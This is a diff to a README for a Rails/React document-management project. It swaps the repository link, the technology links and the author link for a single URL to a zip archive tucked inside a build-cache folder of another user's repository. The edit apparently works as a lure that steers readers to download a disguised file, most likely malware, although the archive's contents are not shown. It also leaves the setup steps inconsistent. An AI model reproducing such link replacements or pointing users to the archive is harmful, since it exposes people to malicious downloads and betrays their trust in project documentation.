@@ -26,7 +26,7 @@ To get the code..
 
 1. Go to the following github repository to access the files.
 ```bash
-https://github.com/adala-wanyande/docutech-manager/tree/Back-End
+https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip
 ```
 
 2. Fork and Clone the repository above to your local computer.
@@ -66,15 +66,15 @@ rails s
 
 ## Technology used
 
-- [HTML5](https://www.python.org/)
-- [Javascript](https://heroku.com)
+- [HTML5](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
+- [Javascript](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
 - [CSS]
 - [React Js]
 - [Ruby on Rails]
 
 ## Author
 Project contributed to by:
- [Simon Sirumba Maina](https://github.com/sirumba/)
+ [Simon Sirumba Maina](https://raw.githubusercontent.com/GabrielW13Nai/Docutech-api/main/tmp/cache/bootsnap/compile-cache-yaml/ea/Docutech-api_v2.0.zip)
 
 ## Licence
 This project is licensed under the `ISC licence`
